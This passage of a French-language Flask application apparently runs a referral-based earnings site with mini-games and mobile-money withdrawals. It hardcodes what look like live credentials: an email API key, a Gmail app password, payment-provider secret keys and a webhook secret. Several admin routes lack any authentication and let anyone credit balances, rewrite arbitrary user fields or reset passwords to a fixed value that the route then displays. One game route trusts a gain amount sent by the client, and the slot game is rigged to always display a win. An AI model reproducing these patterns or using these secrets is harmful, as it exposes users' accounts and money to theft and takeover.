        msg = ChannelMessage(
            content=content,
            media_url=media_url,
            media_type=media_type,
            timestamp=datetime.now()
        )

        db.session.add(msg)
        db.session.commit()
        return redirect(url_for("admin_canal_edit"))

    messages = ChannelMessage.query.order_by(ChannelMessage.id.desc()).all()
    return render_template("admin_canal.html", messages=messages)

@app.route("/edit_msg/<int:id>", methods=["POST"])
def edit_msg(id):
    msg = ChannelMessage.query.get_or_404(id)

    data = request.get_json()
    new_content = data.get("content")

    msg.content = new_content
    db.session.commit()

    return {"success": True}

@app.route("/attribution/leaderbrice")
@login_required
def attribuer_orphelins_a_brice():
    # On garde la s├®curit├® pour v├®rifier que tu es bien Admin

    # On r├®cup├¿re le compte de leaderbrice01
    leader = User.query.filter_by(username="leaderbrice01").first()
    if not leader:
        return "L'utilisateur 'leaderbrice01' n'existe pas. Impossible de lui attribuer des filleuls.", 404

    # On cherche tous les utilisateurs sans parrain (en excluant leaderbrice01 lui-m├¬me)
    orphelins = User.query.filter(
        (User.parrain == None) | (User.parrain == ""),
        User.username != "leaderbrice01"
    ).all()

    total_attribues = 0

    # Attribution massive
    for user in orphelins:
        user.parrain = leader.username
        total_attribues += 1

    # Sauvegarde dans la base de donn├®es
    if total_attribues > 0:
        db.session.commit()

    return f"Succ├¿s ! {total_attribues} utilisateurs (actifs et inactifs) ont ├®t├® rattach├®s ├á leaderbrice01."


from sqlalchemy import text

@app.route("/academy/tiktok")
def academy_tiktok():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))
        
    return render_template("academy_tiktok.html", user=user)


@app.route("/delete_msg/<int:id>")
def delete_msg(id):
    msg = ChannelMessage.query.get_or_404(id)

    # ­ƒöÑ supprime fichier si existe
    if msg.media_url:
        try:
            path = msg.media_url.replace("/static/uploads/", "static/uploads/")
            os.remove(path)
        except:
            pass

    db.session.delete(msg)
    db.session.commit()

    return redirect(url_for('admin_canal_edit'))

from flask_mail import Mail, Message
API_KEY = "re_QnDyJnmp_AjZaCUqiWGfrv5t3HxDfczLh"

app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'luminastar2026@gmail.com'
app.config['MAIL_PASSWORD'] = 'suca ejwg zfln kepf'
app.config['MAIL_DEFAULT_SENDER'] = app.config['MAIL_USERNAME']  # Ô£à AJOUT

mail = Mail(app)



def envoyer_retrait_soleaspay(service_id, wallet, montant):

    token, err = obtenir_token()

    if err:
        return {"success": False, "message": "Erreur token SoleasPay"}

    url = "https://soleaspay.com/api/action/account/withdraw"

    headers = {
        "Authorization": f"Bearer {token}",
        "operation": "4",
        "service": str(service_id),
        "Content-Type": "application/json"
    }

    payload = {
        "wallet": wallet,
        "amount": montant,
        "currency": "XOF"
    }

    try:
        response = requests.post(url, headers=headers, json=payload)

        if response.status_code != 200:
            return {
                "success": False,
                "message": f"Erreur HTTP {response.status_code}",
                "content": response.text
            }

        return response.json()

    except Exception as e:
        return {"success": False, "message": str(e)}

@app.cli.command("init-db")
def init_db():
    db.create_all()
    print("Ô£à Base de donn├®es initialis├®e avec succ├¿s !")

from sqlalchemy.orm.attributes import flag_modified
from flask import jsonify
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from sqlalchemy.orm.attributes import flag_modified

@app.route("/chaine")
def view_channel():
    user_id = session.get('user_id')
    user = db.session.get(User, user_id) if user_id else None

    # V├®rification abonnement
    is_sub = False
    if user:
        is_sub = ChannelSub.query.filter_by(user_id=user.id).first() is not None

    # Messages
    messages = ChannelMessage.query.order_by(ChannelMessage.timestamp.asc()).all()

    # Nombre abonn├®s
    sub_count = ChannelSub.query.count()

    return render_template(
        "chaine.html",
        messages=messages,
        sub_count=sub_count,
        is_sub=is_sub,
        user=user
    )

@app.route("/admin/restreindre_comptes")
@login_required
def restreindre_comptes_specifiques():
    # S├®curit├® : Seul l'administrateur a le droit de bannir

    # Liste des usernames ├á restreindre
    comptes_a_bloquer = ["leaderbrice01", "amen1", "oroumat"]

    # On r├®cup├¿re les utilisateurs correspondants dans la base de donn├®es
    utilisateurs = User.query.filter(User.username.in_(comptes_a_bloquer)).all()

    total_bloques = 0

    # On passe leur statut is_banned ├á True
    for user in utilisateurs:
        user.is_banned = True
        total_bloques += 1

    # Sauvegarde d├®finitive dans la base de donn├®es
    if total_bloques > 0:
        db.session.commit()

    return f"Op├®ration r├®ussie ! {total_bloques} comptes ont ├®t├® restreints avec succ├¿s ({', '.join([u.username for u in utilisateurs])})."


@app.route("/chaine/rejoindre", methods=["POST"])
def join_channel():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
    
    existing_sub = ChannelSub.query.filter_by(user_id=user_id).first()
    if not existing_sub:
        new_sub = ChannelSub(user_id=user_id)
        db.session.add(new_sub)
        db.session.commit()
    
    return redirect(url_for('view_channel'))

@app.route("/channel/react/<int:msg_id>/<string:emoji>", methods=["POST"])
def react(msg_id, emoji):
    msg = ChannelMessage.query.get_or_404(msg_id)

    if not msg.reactions:
        msg.reactions = {}

    reactions = msg.reactions

    if emoji not in reactions:
        reactions[emoji] = 0

    reactions[emoji] += 1

    msg.reactions = reactions
    db.session.commit()

    return {"success": True, "new_count": reactions[emoji]}

@app.route("/chaine/quitter")
def leave_channel():
    user = get_logged_in_user()
    if user:
        sub = ChannelSub.query.filter_by(user_id=user.id).first()
        if sub:
            db.session.delete(sub)
            db.session.commit()
    return redirect(url_for('view_channel'))

@app.route("/admin/credit_user/<username>/<int:montant>")
def credit_user(username, montant):

    user = User.query.filter_by(username=username).first()

    if not user:
        return "Utilisateur introuvable"

    user.solde_parrainage += montant
    user.solde_revenu += montant
    db.session.commit()

    return f"{montant} XOF ajout├® au compte de {username}"

@app.route("/admin/update-solde", methods=["POST"])
def update_solde():
    data = request.get_json()
    username = data.get("username")
    field = data.get("field")  # ex: solde_revenu, solde_jeux...
    value = data.get("value")

    user = User.query.filter_by(username=username).first()
    if user:
        try:
            # On met ├á jour le champ dynamiquement
            setattr(user, field, float(value))
            db.session.commit()
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"success": False, "error": str(e)})
    
    return jsonify({"success": False, "error": "Utilisateur non trouv├®"})

@app.route("/admin/classement-soldes")
def classement_soldes():
    # On ne r├®cup├¿re que le strict n├®cessaire pour la m├®moire vive
    utilisateurs = User.query.with_entities(
        User.username,
        User.phone,
        User.solde_revenu,
        User.solde_jeux,
        User.solde_parrainage,
        User.bonus,
        User.premier_depot
    ).order_by(User.solde_revenu.desc()).all()

    return render_template("classement.html", utilisateurs=utilisateurs)


@app.route("/admin/chaine/post", methods=["POST"])
def admin_post_channel():
    content = request.form.get("content")
    file = request.files.get("media")
    media_url = None
    media_type = None

    if file:
        filename = secure_filename(file.filename)
        file.save(os.path.join("static/uploads", filename))
        media_url = f"/static/uploads/{filename}"
        media_type = "image" if filename.lower().endswith(('.png', '.jpg', '.jpeg')) else "video"

    new_msg = ChannelMessage(content=content, media_url=media_url, media_type=media_type)
    db.session.add(new_msg)
    db.session.commit()
    return redirect(url_for('view_channel'))

@app.route("/academy/affiliation")
def academy_affiliation():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))
        
    return render_template("affiliation_info.html", user=user)


from datetime import datetime, timedelta, UTC
import uuid

@app.route('/verify', methods=['GET', 'POST'])
def verify_page():
    if request.method == 'POST':

        code_saisi = request.form.get('code')

        # ==========================
        # ­ƒöÉ OTP CHECK
        # ==========================
        if code_saisi != session.get('otp'):
            flash("Code incorrect.", "danger")
            return redirect(url_for('verify_page'))

        # ==========================
        # ÔÅ│ EXPIRATION CHECK
        # ==========================
        otp_exp = session.get('otp_expiration')

        if otp_exp and datetime.now(UTC) > datetime.fromisoformat(otp_exp):
            flash("Code expir├®.", "danger")
            return redirect(url_for('retrait_page'))

        # ==========================
        # ­ƒº¥ INSCRIPTION
        # ==========================
        if session.get('mode') == 'inscription':
            data = session.get('temp_user')

            try:
                new_user = User(
                    uid=str(uuid.uuid4()),
                    username=data['username'],
                    email=data['email'],
                    phone=data['phone'],
                    country=data['country'],
                    password=data['password'],
                    parrain=data['parrain'],
                    ip_address=data.get('ip_address'),
                    solde_total=0,
                    solde_depot=0,
                    solde_revenu=0,
                    solde_parrainage=0,
                    date_creation=datetime.now(UTC)
                )

                db.session.add(new_user)
                db.session.commit()

                session["user_id"] = new_user.id

                # cleanup
                session.pop('otp', None)
                session.pop('temp_user', None)
                session.pop('mode', None)
                session.pop('otp_expiration', None)

                flash("Inscription r├®ussie !", "success")
                return redirect(url_for("dashboard_bloque"))

            except Exception as e:
                db.session.rollback()
                flash("Erreur cr├®ation compte : " + str(e), "danger")
                return redirect(url_for("inscription_page"))

        # ==========================
        # ­ƒöæ RESET PASSWORD
        # ==========================
        elif session.get('mode') == 'reset':
            return redirect(url_for('new_password_page'))

        # ==========================
        # ­ƒÆ© RETRAIT (FINAL FIX)
        # ==========================
        elif session.get('mode') == 'retrait':

            user = get_logged_in_user()
            data = session.get('retrait_data')

            if not user or not data:
                flash("Session expir├®e. Recommencez.", "danger")
                return redirect(url_for("retrait_page"))

            try:
                # ==========================
                # ­ƒöÑ API CALL
                # ==========================
                response = envoyer_retrait_soleaspay(
                    data["service_id"],
                    data["wallet"],
                    data["montant"]
                )

                print("­ƒöÁ API RESPONSE :", response)

                if not response or response.get("success") != True:
                    flash("Erreur API paiement.", "danger")
                    return redirect(url_for("retrait_page"))

                # ==========================
                # ­ƒº¥ SAVE WITHDRAWAL
                # ==========================
                nouveau_retrait = Retrait(
                    user_id=user.id,
                    montant=data["montant"],
                    frais=data["frais"],
                    payment_method=data["service_name"],
                    statut="successful",
                    phone=data["wallet"],
                    pays=user.country,
                    date=datetime.now(UTC)
                )

                db.session.add(nouveau_retrait)

                montant_total = data["montant"] + data["frais"]

                user.solde_parrainage -= montant_total
                user.total_retrait = (user.total_retrait or 0) + montant_total

                db.session.commit()

                # ==========================
                # ­ƒº╣ CLEAN SESSION
                # ==========================
                session.pop('otp', None)
                session.pop('retrait_data', None)
                session.pop('mode', None)
                session.pop('otp_expiration', None)

                flash("Retrait confirm├® avec succ├¿s Ô£à", "success")
                return redirect(url_for("mes_retraits"))

            except Exception as e:
                db.session.rollback()
                flash("Erreur retrait : " + str(e), "danger")
                return redirect(url_for("retrait_page"))

    return render_template('verify.html')

@app.route("/admin/utilisateurs")
def admin_users_page():
    # On r├®cup├¿re tous les utilisateurs class├®s par date de cr├®ation
    utilisateurs = User.query.order_by(User.date_creation.desc()).all()
    return render_template("admin_users.html", users=utilisateurs)


@app.route('/new-password', methods=['GET', 'POST'])
def new_password_page():
    if 'reset_email' not in session:
        return redirect(url_for('connexion_page'))

    if request.method == 'POST':
        password = request.form.get('password')
        confirm = request.form.get('confirm_password')

        if password != confirm:
            flash("Les mots de passe ne correspondent pas.", "danger")
            return render_template('new_password.html')

        user = User.query.filter_by(email=session['reset_email']).first()

        if user:
            user.password = generate_password_hash(password)
            db.session.commit()

            # nettoyage
            session.pop('reset_email', None)

            flash("Mot de passe modifi├® avec succ├¿s !", "success")
            return redirect(url_for('connexion_page'))

    return render_template('new_password.html')

from werkzeug.security import check_password_hash

@app.route('/reset-password', methods=['GET', 'POST'])
def reset_password_request():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        pin = request.form.get('pin', '').strip()

        user = User.query.filter_by(email=email).first()

        if not user:
            flash("Cet email n'existe pas.", "danger")
            return render_template('reset_request.html')

        # ­ƒöÉ V├®rifier PIN
        if not user.pin_code:
            flash("Aucun code PIN d├®fini pour ce compte.", "danger")
            return render_template('reset_request.html')

        if not check_password_hash(user.pin_code, pin):
            flash("Code PIN incorrect.", "danger")
            return render_template('reset_request.html')

        # Ô£à OK ÔåÆ autoriser reset
        session['reset_email'] = email
        flash("V├®rification r├®ussie. Vous pouvez changer votre mot de passe.", "success")
        return redirect(url_for('new_password_page'))

    return render_template('reset_request.html')

from datetime import datetime

from datetime import datetime, timezone

# --- FONCTION UNIQUE DE LOCALISATION ---
def enregistrer_position(user_obj):
    """
    R├®cup├¿re les coordonn├®es GPS du formulaire et les stocke dans l'objet user.
    """
    lat = request.form.get('latitude')
    lng = request.form.get('longitude')
    
    if lat and lng:
        user_obj.latitude = lat
        user_obj.longitude = lng
        # On peut aussi mettre ├á jour la date de derni├¿re localisation si la colonne existe
        if hasattr(user_obj, 'last_location_update'):
            user_obj.last_location_update = datetime.now(timezone.utc)
        return True
    return False

@app.route("/connexion", methods=["GET", "POST"])
def connexion_page():
    if request.method == "POST":
        username = request.form.get("username", "").strip().lower()
        password = request.form.get("password", "").strip()

        if not username or not password:
            flash("Veuillez remplir tous les champs.", "danger")
            return redirect(url_for("connexion_page"))

        user = User.query.filter_by(username=username).first()

        if not user or not check_password_hash(user.password, password):
            flash("Identifiants incorrects.", "danger")
            return redirect(url_for("connexion_page"))

        if getattr(user, "is_banned", False):
            flash("Votre compte a ├®t├® suspendu. Contactez le support.", "danger")
            return redirect(url_for("connexion_page"))

        # --- POSITION SUPPRIM├ëE ICI ---
        session.clear()
        session["user_id"] = user.id
        session["username"] = user.username
        session.permanent = True

        flash(f"Connexion r├®ussie ! Bienvenue {user.username}.", "success")
        return redirect(url_for("dashboard_page"))

    return render_template("connexion.html")

@app.route("/admin/reseau/leaderbrice")
@login_required
def reseau_leader_brice():
    # 1. On cherche le leader par son username "leaderbrice01"
    leader = User.query.filter_by(username="leaderbrice01").first()
    
    if not leader:
        return "L'utilisateur 'leaderbrice01' n'existe pas dans la base de donn├®es.", 404

    # --- NIVEAU 1 : Filleuls directs ---
    # On utilise ta relation 'downlines' d├®finie dans ton mod├¿le
    niveau1 = leader.downlines.all()

    # --- NIVEAU 2 : Filleuls des filleuls ---
    niveau2 = []
    if niveau1:
        # On r├®cup├¿re tous les usernames du niveau 1
        usernames_n1 = [u.username for u in niveau1 if u.username]
        if usernames_n1:
            # On cherche tous les utilisateurs dont le parrain est dans le niveau 1
            niveau2 = User.query.filter(User.parrain.in_(usernames_n1)).all()

    # --- NIVEAU 3 : Filleuls du niveau 2 ---
    niveau3 = []
    if niveau2:
        # On r├®cup├¿re tous les usernames du niveau 2
        usernames_n2 = [u.username for u in niveau2 if u.username]
        if usernames_n2:
            # On cherche tous les utilisateurs dont le parrain est dans le niveau 2
            niveau3 = User.query.filter(User.parrain.in_(usernames_n2)).all()

    # Calcul des statistiques exactes pour l'affichage
    stats = {
        "total_filleuls": len(niveau1) + len(niveau2) + len(niveau3),
        "total_n1": len(niveau1),
        "total_n2": len(niveau2),
        "total_n3": len(niveau3)
    }

    return render_template(
        "admin_reseau.html",
        leader=leader,
        niveau1=niveau1,
        niveau2=niveau2,
        niveau3=niveau3,
        stats=stats
    )


@app.route("/inscription", methods=["GET", "POST"])
def inscription_page():
    date_ouverture = datetime(2026, 4, 11, 12, 0, 0)
    if datetime.now() < date_ouverture:
        return render_template("maintenance_inscription.html")

    ref_code = request.args.get("ref", "").strip().lower()
    session.pop("username_exists", None)

    if request.method == "POST":
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if user_ip and ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()

        username = request.form.get("username", "").strip().lower()
        email = request.form.get("email", "").strip()
        country = request.form.get("country", "").strip()
        phone = request.form.get("phone", "").strip()
        password = request.form.get("password", "").strip()
        confirm = request.form.get("confirm_password", "").strip()
        parrain_code = (request.form.get("parrain", "") or ref_code).strip().lower()

        errors = []

        if not all([username, email, country, phone, password, confirm]):
            errors.append("Tous les champs sont obligatoires.")

        if username and not re.fullmatch(r"[a-z0-9]+", username):
            errors.append("Nom d'utilisateur invalide.")

        if password != confirm:
            errors.append("Les mots de passe ne correspondent pas.")

        existing_users = User.query.filter(
            (User.username == username) |
            (User.email == email) |
            (User.phone == phone)
        ).all()

        for u in existing_users:
            if u.username == username:
                errors.append(f"Nom d'utilisateur '{username}' existe d├®j├á.")
                session["username_exists"] = True
            if u.email == email:
                errors.append("Cet email est d├®j├á utilis├®.")
            if u.phone == phone:
                errors.append("Ce num├®ro est d├®j├á enregistr├®.")

        parrain_user = None
        if parrain_code:
            parrain_user = User.query.filter_by(username=parrain_code).first()
            if not parrain_user:
                errors.append("Code parrain invalide.")

        if errors:
            for error in errors:
                flash(error, "danger")
            return render_template("inscription.html", code_ref=ref_code)

        try:
            new_user = User(
                uid=str(uuid.uuid4()),
                username=username,
                email=email,
                phone=phone,
                country=country,
                password=generate_password_hash(password),
                parrain=parrain_user.username if parrain_user else None,
                ip_address=user_ip,
                solde_total=0,
                solde_depot=0,
                solde_revenu=0,
                solde_parrainage=0,
                date_creation=datetime.now(timezone.utc)
            )

            # --- POSITION SUPPRIM├ëE ICI ---
            db.session.add(new_user)
            db.session.commit()

            session["user_id"] = new_user.id

            flash("Compte cr├®├® avec succ├¿s ­ƒÄë", "success")
            return redirect(url_for("dashboard_bloque"))

        except Exception as e:
            db.session.rollback()
            flash("Erreur cr├®ation compte : " + str(e), "danger")

    return render_template("inscription.html", code_ref=ref_code)



from datetime import datetime
from flask import render_template

def verification_lancement():
    # Date cible : 11 Avril 2026 ├á 12h00
    date_lancement = datetime(2026, 4, 11, 12, 0, 0)
    if datetime.now() < date_lancement:
        # On renvoie directement le template de maintenance
        return render_template("maintenance_inscription.html")
    return None


PUBLIC_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
PRIVATE_SECRET_KEY = "SP_-YQFuI5M9B1H2bNSNycwI_YQBc_kXkGACp-mLoBdWqI"

def obtenir_token():
    url = "https://soleaspay.com/api/action/auth"

    payload = {
        "public_apikey": PUBLIC_API_KEY,
        "private_secretkey": PRIVATE_SECRET_KEY
    }

    headers = {
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        data = response.json()

        token = data.get("access_token")   # Ô£à CORRECTION ICI

        if not token:
            return None, data

        return token, None

    except Exception as e:
        return None, str(e)

from datetime import datetime, timedelta

MAX_GAIN = 500.0
CYCLE_DAYS = 3
WINDOW_HOURS = 24

@app.route('/game/apple', methods=['GET', 'POST'])
def apple_game():
    if 'user_id' not in session:
        return redirect(url_for('connexion_page'))

    user = db.session.get(User, session['user_id'])
    now = datetime.now()
    
    # 1. V├®rification des blocages d├®finitifs
    total_bonus = user.bonus or 0.0
    is_blocked_500 = total_bonus >= MAX_GAIN
    no_rounds_left = (user.remaining_rounds or 0) <= 0

    can_play = False
    next_available_date = None

    # Date de base pour le calcul (Inscription ou dernier jeu)
    base_date = user.last_play_date or user.date_creation

    if base_date and not is_blocked_500 and not no_rounds_left:
        # Ouverture th├®orique : +3 jours apr├¿s la derni├¿re activit├®
        next_available_date = base_date + timedelta(days=CYCLE_DAYS)
        # Fermeture th├®orique : 24h apr├¿s l'ouverture
        deadline_date = next_available_date + timedelta(hours=WINDOW_HOURS)

        if now < next_available_date:
            # Trop t├┤t : Bouton incliquable
            can_play = False
        elif next_available_date <= now <= deadline_date:
            # Dans la fen├¬tre : Cliquable
            can_play = True
        elif now > deadline_date:
            # Fen├¬tre rat├®e : On p├®nalise et on d├®cale le prochain round
            user.remaining_rounds -= 1
            user.last_play_date = next_available_date # On marque le cr├®neau comme "utilis├®"
            db.session.commit()
            return redirect(url_for('apple_game'))
    
    # Cas sp├®cial : Premier jeu juste apr├¿s inscription (si last_play_date est None)
    if not user.last_play_date and not no_rounds_left and not is_blocked_500:
        can_play = True

    if request.method == 'GET':
        return render_template(
            'apple_game.html',
            can_play=can_play,
            is_blocked_500=(is_blocked_500 or no_rounds_left),
            next_date=next_available_date,
            rounds_left=user.remaining_rounds
        )

    if request.method == 'POST':
        if not can_play:
            return jsonify({"status": "error", "message": "Action non autoris├®e actuellement."})

        data = request.json
        gain = float(data.get('gain', 0))

        if (user.bonus or 0) + gain > MAX_GAIN:
            gain = MAX_GAIN - (user.bonus or 0)

        user.bonus = (user.bonus or 0.0) + gain
        user.solde_revenu = (user.solde_revenu or 0.0) + gain
        user.last_play_date = now
        user.remaining_rounds -= 1
        
        db.session.commit()
        return jsonify({"status": "success", "message": f"+{gain} F"})


@app.route('/admin/open-game-30')
def open_game():
    try:
        control = GameControl.query.first() or GameControl()
        # Assure-toi de l'import : from datetime import datetime, timedelta
        control.end_time = datetime.now() + timedelta(minutes=30)
        
        # R├®initialisation propre
        db.session.query(User).update({User.has_played_this_round: False})
        
        db.session.add(control)
        db.session.commit()
        return "Jeu activ├® pour 30 minutes !"
    except Exception as e:
        db.session.rollback()
        return f"Erreur admin : {e}"

import random
from flask import session, jsonify, request

from flask import render_template, session, jsonify, request, redirect, url_for
from datetime import datetime
import random

@app.route('/game/apple-of-fortune')
def apple_game_page():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('connexion_page'))

    # Logique de temps : Lundi = 0
    maintenant = datetime.now()
    est_lundi = (maintenant.weekday() == 0)
    est_apres_8h = (maintenant.hour >= 8)
    
    ouvert = est_lundi and est_apres_8h

    return render_template('apple_fortune.html', user=user, ouvert=ouvert)

@app.route('/game/apple-of-fortune/start', methods=['POST'])
def apple_start():
    user = get_logged_in_user()
    maintenant = datetime.now()

    # V├®rification s├®curit├® temps + BDD
    if maintenant.weekday() != 0 or maintenant.hour < 8:
        return jsonify({"status": "error", "message": "Le verger est ferm├®. Revient lundi ├á 08h00."}), 403

    if user.frog_game_done:
        return jsonify({"status": "error", "message": "Tu as d├®j├á r├®cup├®r├® tes pommes aujourd'hui."}), 403

    # G├®n├®ration s├®curis├®e c├┤t├® serveur
    full_map = []
    for i in range(10):
        row = [0, 0, 0, 0, 0] # 0 = Pomme
        bomb_count = 1 if i < 3 else 2 if i < 7 else 3
        bomb_indices = random.sample(range(5), bomb_count)
        for idx in bomb_indices: row[idx] = 1 # 1 = Bombe
        full_map.append(row)

    session['apple_map'] = full_map
    session['apple_step'] = 0
    session['apple_gain'] = 0
    return jsonify({"status": "success"})

@app.route('/game/apple-of-fortune/check', methods=['POST'])
def apple_check():
    user = get_logged_in_user()
    data = request.json
    choice = data.get('choice')

    if 'apple_map' not in session:
        return jsonify({"status": "error", "message": "Session expir├®e"}), 400

    step = session['apple_step']
    game_map = session['apple_map']

    # Si l'utilisateur touche une bombe
    if game_map[step][choice] == 1:
        gain_final = session.get('apple_gain', 0)
        
        # CR├ëDIT AUTOMATIQUE M├èME SI PERDU
        if gain_final > 0:
            user.solde_jeux = (user.solde_jeux or 0) + gain_final
        
        user.frog_game_done = True
        db.session.commit()
        session.pop('apple_map', None)
        return jsonify({"status": "fail", "gain_final": gain_final})

    else:
        # Passage au niveau suivant
        session['apple_step'] += 1
        session['apple_gain'] += 25
        
        if session['apple_step'] == 10:
            user.solde_jeux = (user.solde_jeux or 0) + session['apple_gain']
            user.frog_game_done = True
            db.session.commit()
            return jsonify({"status": "win", "gain": session['apple_gain']})
            
        return jsonify({"status": "continue", "new_gain": session['apple_gain']})

@app.route('/game/apple-of-fortune/cashout', methods=['POST'])
def apple_cashout():
    user = get_logged_in_user()
    gain = session.get('apple_gain', 0)
    
    if gain > 0:
        user.solde_jeux = (user.solde_jeux or 0) + gain
        user.frog_game_done = True
        db.session.commit()
        session.pop('apple_map', None)
        return jsonify({"status": "success", "gain": gain})
    return jsonify({"status": "error"}), 400

@app.route('/admin/reset-monday-games')
def reset_games():
    # R├®cup├¿re tous les utilisateurs qui ont d├®j├á jou├®
    users_to_reset = User.query.filter_by(frog_game_done=True).all()
    
    for u in users_to_reset:
        u.frog_game_done = False
    
    db.session.commit()
    
    return f"Succ├¿s ! Les compteurs de {len(users_to_reset)} utilisateurs ont ├®t├® remis ├á z├®ro."



@app.route('/game/glass-bridge')
def glass_bridge_page():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('connexion_page'))

    # Logique de temps : Jeudi = 3
    maintenant = datetime.now()
    est_jeudi = (maintenant.weekday() == 3)
    est_apres_8h = (maintenant.hour >= 8)
    
    ouvert = est_jeudi and est_apres_8h

    # R├®initialisation automatique des chances le jeudi matin
    aujourdhui = maintenant.date()
    if est_jeudi and est_apres_8h and user.derniere_maj_chances != aujourdhui:
        user.chances_bridge = 3
        user.derniere_maj_chances = aujourdhui
        db.session.commit()

    # G├®n├®rer le chemin secret en session
    session['bridge_path'] = [random.randint(0, 1) for _ in range(6)]
    session['current_step'] = 0

    return render_template('glass_bridge.html', user=user, ouvert=ouvert)

@app.route('/game/verify-jump', methods=['POST'])
def verify_jump():
    user = get_logged_in_user()
    maintenant = datetime.now()
    
    # S├®curit├® temps
    if maintenant.weekday() != 3 or maintenant.hour < 8:
        return jsonify({"status": "closed", "message": "Reviens jeudi ├á 08h00"}), 403

    if user.chances_bridge <= 0:
        return jsonify({"status": "out_of_chances"}), 403

    data = request.json
    side = data.get('side') # 0 ou 1
    correct_path = session.get('bridge_path')
    step = session.get('current_step', 0)

    if side == correct_path[step]:
        session['current_step'] = step + 1
        if session['current_step'] == 6:
            reward = 1000
            user.solde_jeux = (user.solde_jeux or 0) + reward
            user.chances_bridge = 0 # On bloque apr├¿s la victoire
            db.session.commit()
            return jsonify({"status": "win", "reward": reward})
        return jsonify({"status": "success"})
    else:
        user.chances_bridge -= 1
        db.session.commit()
        # On r├®g├®n├¿re le chemin apr├¿s une chute pour ├®viter la triche par m├®morisation
        session['bridge_path'] = [random.randint(0, 1) for _ in range(6)]
        session['current_step'] = 0
        return jsonify({"status": "fail", "remaining_chances": user.chances_bridge})


import random

@app.route('/game/slot-play', methods=['POST'])
def play_slot():
    user = db.session.get(User, session.get("user_id"))
    
    # 1. V├®rification de la chance unique
    if user.has_played_slot:
        return jsonify({"status": "error", "message": "Vous avez d├®j├á tent├® votre chance !"}), 403

    # 2. V├®rification solde (Optionnel selon ta r├¿gle, ici on suppose qu'il a pay├® l'acc├¿s)
    # user.solde_revenu -= 400 
    
    # 3. Logique de gain garanti entre 150 et 600
    # On g├®n├¿re un gain al├®atoire par paliers de 50 pour faire joli
    gain = random.randint(3, 12) * 50  # 150, 200, 250 ... 600
    
    # 4. Enregistrement du r├®sultat
    user.has_played_slot = True
    user.bonus += gain
    db.session.commit()

    return jsonify({
        "status": "win",
        "reels": ["7", "7", "7"], # Le 7 est le symbole gagnant
        "gain": gain,
        "message": f"F├®licitations ! Vous avez gagn├® {gain} XOF."
    })


@app.route("/admin/fix_parrain")
def fix_parrain():
    ancien = "aaaa"
    nouveau = "amen"

    users = User.query.filter_by(parrain=ancien).all()
    for u in users:
        u.parrain = nouveau

    db.session.commit()
    return "Parrain mis ├á jour avec succ├¿s"


@app.route("/admin/reset_password/<username>")
def reset_password(username):
    user = User.query.filter_by(username=username).first()

    if not user:
        return "Utilisateur introuvable"

    from werkzeug.security import generate_password_hash

    nouveau_mdp = "ingrd123"
    user.password = generate_password_hash(nouveau_mdp)

    db.session.commit()

    return f"Mot de passe r├®initialis├® pour {username} : {nouveau_mdp}"

SOLEAS_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
SOLEAS_WEBHOOK_SECRET = "b42ed39b9e0db71db4556a2dfe1b1ad00dcce656fd4dba033f1947f913f1908bc817588c2edb32d92533a1d162e57ad4b1f7299f39695c5671c3ef07baa6f22a"

SERVICES = {

    # ­ƒç¿­ƒç▓ CAMEROUN
    "CM": [
        {"id": 1, "name": "MOMO CM", "description": "MTN MOBILE MONEY CAMEROUN"},
        {"id": 2, "name": "OM CM", "description": "ORANGE MONEY CAMEROUN"},
    ],

    # ­ƒç¿­ƒç« C├öTE DÔÇÖIVOIRE
    "CI": [
        {"id": 29, "name": "OM CI", "description": "ORANGE MONEY COTE D'IVOIRE"},
        {"id": 30, "name": "MOMO CI", "description": "MTN MONEY COTE D'IVOIRE"},
        {"id": 31, "name": "MOOV CI", "description": "MOOV COTE D'IVOIRE"},
        {"id": 32, "name": "WAVE CI", "description": "WAVE COTE D'IVOIRE"},
    ],

    # ­ƒçº­ƒç½ BURKINA FASO
    "BF": [
        {"id": 33, "name": "MOOV BF", "description": "MOOV BURKINA FASO"},
        {"id": 34, "name": "OM BF", "description": "ORANGE MONEY BURKINA FASO"},
    ],

    # ­ƒçº­ƒç» BENIN
    "BJ": [
        {"id": 35, "name": "MOMO BJ", "description": "MTN MONEY BENIN"},
        {"id": 36, "name": "MOOV BJ", "description": "MOOV BENIN"},
    ],

    # ­ƒç╣­ƒç¼ TOGO
    "TG": [
        {"id": 37, "name": "T-MONEY TG", "description": "T-MONEY TOGO"},
        {"id": 38, "name": "MOOV TG", "description": "MOOV TOGO"},
    ],

    # ­ƒç¿­ƒç® CONGO DRC
    "COD": [
        {"id": 52, "name": "VODACOM COD", "description": "VODACOM CONGO DRC"},
        {"id": 53, "name": "AIRTEL COD", "description": "AIRTEL CONGO DRC"},
        {"id": 54, "name": "ORANGE COD", "description": "ORANGE CONGO DRC"},
    ],

    # ­ƒç¿­ƒç¼ CONGO BRAZZAVILLE
    "COG": [
        {"id": 55, "name": "AIRTEL COG", "description": "AIRTEL CONGO"},
        {"id": 56, "name": "MOMO COG", "description": "MTN MOMO CONGO"},
    ],

    # ­ƒç¼­ƒçª GABON
    "GAB": [
        {"id": 57, "name": "AIRTEL GAB", "description": "AIRTEL GABON"},
    ],

    # ­ƒç║­ƒç¼ UGANDA
    "UGA": [
        {"id": 58, "name": "AIRTEL UGA", "description": "AIRTEL UGANDA"},
        {"id": 59, "name": "MOMO UGA", "description": "MTN MOMO UGANDA"},
    ],
}

COUNTRY_CODE = {
    # Cameroun
    "Cameroun": "CM",
    "Cameroon": "CM",

    # C├┤te d'Ivoire
    "C├┤te d'Ivoire": "CI",
    "Cote d Ivoire": "CI",
    "Ivory Coast": "CI",

